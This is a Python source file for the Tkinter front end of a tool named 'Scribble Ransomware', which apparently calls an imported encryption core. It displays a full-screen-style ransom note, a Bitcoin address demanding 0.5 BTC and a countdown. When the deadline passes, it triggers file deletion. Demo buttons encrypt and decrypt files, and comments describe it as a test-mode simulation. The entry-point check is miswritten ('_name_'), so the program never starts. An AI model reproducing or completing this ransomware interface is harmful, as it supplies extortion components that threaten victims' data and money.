import os
import sys
import time
import json
import threading
import datetime
import tkinter as tk
from tkinter import ttk, messagebox, PhotoImage
from pathlib import Path
from scribble_core import ScribbleRansomware, create_test_files

class ScribbleGUI:
    def __init__(self, master, ransomware):
        """
        Initialize the Scribble GUI.
        
        Args:
            master: Tkinter root window
            ransomware: ScribbleRansomware instance
        """
        self.master = master
        self.ransomware = ransomware
        
        # Configure the main window
        self.master.title("SYSTEM ALERT")
        self.master.configure(bg="#1a1a1a")
        self.master.geometry("800x600")
        self.master.resizable(False, False)
        
        # Try to make window stay on top and full screen
        self.master.attributes("-topmost", True)
        
        # Create the GUI elements
        self.create_widgets()
        
        # Start the countdown timer
        self.timer_running = True
        self.timer_thread = threading.Thread(target=self.update_timer, daemon=True)
        self.timer_thread.start()
    
    def create_widgets(self):
        """Create the main GUI widgets"""
        # Main frame
        main_frame = tk.Frame(self.master, bg="#1a1a1a", padx=20, pady=20)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Header with warning icon
        header_frame = tk.Frame(main_frame, bg="#1a1a1a")
        header_frame.pack(fill=tk.X, pady=(0, 20))
        
        # Warning label
        warning_label = tk.Label(
            header_frame,
            text="YOUR FILES HAVE BEEN ENCRYPTED!",
            font=("Arial", 24, "bold"),
            fg="#ff0000",
            bg="#1a1a1a",
            pady=20
        )
        warning_label.pack()
        
        # Content frame with information
        content_frame = tk.Frame(main_frame, bg="#1a1a1a")
        content_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Information text
        info_text = (
            "All your documents, photos, databases and other important files have been encrypted with "
            "strong encryption using Scribble Ransomware.\n\n"
            "The only way to decrypt your files is to pay the ransom and obtain the decryption key "
            "before the countdown timer expires.\n\n"
            "If the timer expires, the decryption key will be PERMANENTLY DESTROYED and "
            "your files will be lost forever!"
        )
        
        info_label = tk.Label(
            content_frame,
            text=info_text,
            font=("Arial", 12),
            fg="#ffffff",
            bg="#1a1a1a",
            justify=tk.LEFT,
            wraplength=750
        )
        info_label.pack(pady=10, anchor=tk.W)
        
        # File information
        if self.ransomware.encrypted_files:
            file_info = f"Number of encrypted files: {len(self.ransomware.encrypted_files)}"
        else:
            file_info = "No files have been encrypted yet."
        
        file_label = tk.Label(
            content_frame,
            text=file_info,
            font=("Arial", 12),
            fg="#ffffff",
            bg="#1a1a1a"
        )
        file_label.pack(pady=10, anchor=tk.W)
        
        # Countdown frame
        countdown_frame = tk.Frame(content_frame, bg="#2a2a2a", padx=20, pady=20)
        countdown_frame.pack(fill=tk.X, pady=20)
        
        countdown_label = tk.Label(
            countdown_frame,
            text="TIME REMAINING:",
            font=("Arial", 14, "bold"),
            fg="#ffffff",
            bg="#2a2a2a"
        )
        countdown_label.pack(pady=(0, 10))
        
        self.timer_label = tk.Label(
            countdown_frame,
            text="00:00:00",
            font=("Arial", 36, "bold"),
            fg="#ff0000",
            bg="#2a2a2a"
        )
        self.timer_label.pack()
        
        # Payment section
        payment_frame = tk.Frame(main_frame, bg="#1a1a1a", pady=20)
        payment_frame.pack(fill=tk.X)
        
        payment_label = tk.Label(
            payment_frame,
            text="Payment Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
            font=("Courier", 12),
            fg="#ffcc00",
            bg="#1a1a1a"
        )
        payment_label.pack(pady=10)
        
        amount_label = tk.Label(
            payment_frame,
            text="Amount: 0.5 BTC",
            font=("Arial", 14, "bold"),
            fg="#ffcc00",
            bg="#1a1a1a"
        )
        amount_label.pack(pady=5)
        
        # Buttons
        button_frame = tk.Frame(main_frame, bg="#1a1a1a")
        button_frame.pack(fill=tk.X, pady=20)
        
        self.payment_button = tk.Button(
            button_frame,
            text="I've Made the Payment",
            font=("Arial", 12, "bold"),
            bg="#006600",
            fg="#ffffff",
            padx=20,
            pady=10,
            command=self.payment_made
        )
        self.payment_button.pack(side=tk.LEFT, padx=10)
        
        # For simulation purposes only - normally this wouldn't exist
        self.decrypt_button = tk.Button(
            button_frame,
            text="Decrypt Files (Demo)",
            font=("Arial", 12),
            bg="#003366",
            fg="#ffffff",
            padx=20,
            pady=10,
            command=self.decrypt_files
        )
        self.decrypt_button.pack(side=tk.LEFT, padx=10)
        
        # For simulation purposes only - create test files
        self.test_button = tk.Button(
            button_frame,
            text="Create Test Files",
            font=("Arial", 12),
            bg="#333333",
            fg="#ffffff",
            padx=20,
            pady=10,
            command=self.create_test_files
        )
        self.test_button.pack(side=tk.LEFT, padx=10)
        
        # For simulation purposes only - encrypt files
        self.encrypt_button = tk.Button(
            button_frame,
            text="Encrypt Files",
            font=("Arial", 12),
            bg="#990000",
            fg="#ffffff",
            padx=20,
            pady=10,
            command=self.encrypt_files
        )
        self.encrypt_button.pack(side=tk.LEFT, padx=10)
    
    def update_timer(self):
        """Update the countdown timer"""
        while self.timer_running:
            # Get remaining time
            remaining = self.ransomware.time_remaining()
            
            # Format time as HH:MM:SS
            hours, remainder = divmod(int(remaining), 3600)
            minutes, seconds = divmod(remainder, 60)
            time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            
            # Update timer label
            self.timer_label.config(text=time_str)
            
            # Check if deadline has passed
            if self.ransomware.is_deadline_passed():
                self.timer_label.config(text="TIME EXPIRED", fg="#ff0000")
                self.payment_button.config(state=tk.DISABLED)
                
                # Start file deletion process
                self.delete_files()
                
                # Stop the timer
                self.timer_running = False
                break
            
            # Wait 1 second
            time.sleep(1)
    
    def payment_made(self):
        """Handle payment button click"""
        # In a real scenario, this would verify payment
        # For simulation, we'll just show a dialog
        messagebox.showinfo(
            "Payment Verification",
            "Verifying payment... Please wait.\n\n"
            "For simulation purposes, click 'Decrypt Files' to simulate successful payment."
        )
    
    def decrypt_files(self):
        """Handle decrypt button click"""
        # Show decryption progress
        progress_window = tk.Toplevel(self.master)
        progress_window.title("Decrypting Files")
        progress_window.geometry("400x150")
        progress_window.transient(self.master)
        progress_window.grab_set()
        
        # Progress message
        message = tk.Label(
            progress_window,
            text="Decrypting your files. Please wait...",
            font=("Arial", 12),
            pady=10
        )
        message.pack()
        
        # Progress bar
        progress = ttk.Progressbar(progress_window, orient=tk.HORIZONTAL, length=350, mode='indeterminate')
        progress.pack(pady=10)
        progress.start()
        
        # Start decryption in a separate thread
        def decrypt_thread():
            # Decrypt files
            num_decrypted = self.ransomware.start_decryption()
            
            # Update UI
            progress.stop()
            message.config(text=f"Successfully decrypted {num_decrypted} files!")
            
            # Add close button
            close_button = tk.Button(
                progress_window,
                text="Close",
                command=progress_window.destroy
            )
            close_button.pack(pady=10)
            
            # If all files decrypted, close the main window
            if len(self.ransomware.encrypted_files) == 0:
                self.timer_running = False
                messagebox.showinfo(
                    "Decryption Complete",
                    "All your files have been successfully decrypted!"
                )
                # Reset UI elements
                self.timer_label.config(text="COMPLETED", fg="#00ff00")
        
        # Start the thread
        threading.Thread(target=decrypt_thread, daemon=True).start()
    
    def delete_files(self):
        """Delete files after deadline"""
        # Show deletion warning
        messagebox.showerror(
            "DEADLINE EXPIRED",
            "The deadline has expired. Your encryption key is being deleted "
            "and your files will be permanently lost."
        )
        
        # Start deletion in a separate thread
        def delete_thread():
            # Delete files
            self.ransomware.delete_files()
            
            # Update UI
            messagebox.showerror(
                "FILES LOST",
                "Your files have been permanently deleted. The encryption key has been destroyed."
            )
        
        # Start the thread
        threading.Thread(target=delete_thread, daemon=True).start()
    
    def create_test_files(self):
        """Create test files for demonstration"""
        test_dir = os.path.join(os.getcwd(), "test_files")
        num_created = create_test_files(test_dir, 10)
        messagebox.showinfo(
            "Test Files Created",
            f"Created {num_created} test files in {test_dir}"
        )
    
    def encrypt_files(self):
        """Encrypt files for demonstration"""
        # Show encryption progress
        progress_window = tk.Toplevel(self.master)
        progress_window.title("Encrypting Files")
        progress_window.geometry("400x150")
        progress_window.transient(self.master)
        progress_window.grab_set()
        
        # Progress message
        message = tk.Label(
            progress_window,
            text="Searching for files to encrypt...",
            font=("Arial", 12),
            pady=10
        )
        message.pack()
        
        # Progress bar
        progress = ttk.Progressbar(progress_window, orient=tk.HORIZONTAL, length=350, mode='indeterminate')
        progress.pack(pady=10)
        progress.start()
        
        # Start encryption in a separate thread
        def encrypt_thread():
            # Encrypt files
            num_encrypted = self.ransomware.start_encryption()
            
            # Update UI
            progress.stop()
            message.config(text=f"Encrypted {num_encrypted} files!")
            
            # Add close button
            close_button = tk.Button(
                progress_window,
                text="Close",
                command=progress_window.destroy
            )
            close_button.pack(pady=10)
            
            # Update file info on main window
            file_info = f"Number of encrypted files: {len(self.ransomware.encrypted_files)}"
            for widget in self.master.winfo_children():
                if isinstance(widget, tk.Frame):
                    for child in widget.winfo_children():
                        if isinstance(child, tk.Frame) and child.winfo_children():
                            for grandchild in child.winfo_children():
                                if isinstance(grandchild, tk.Label) and "encrypted files" in grandchild.cget("text"):
                                    grandchild.config(text=file_info)
        
        # Start the thread
        threading.Thread(target=encrypt_thread, daemon=True).start()

# Main entry point
def main():
    # Initialize the ransomware in test mode
    ransomware = ScribbleRansomware(test_mode=True)
    
    # Check if a previous session exists
    previous_session = ransomware.load_metadata()
    
    # Create the main window
    root = tk.Tk()
    app = ScribbleGUI(root, ransomware)
    
    # Start the main loop
    root.mainloop()

if _name_ == "_main_":
    main()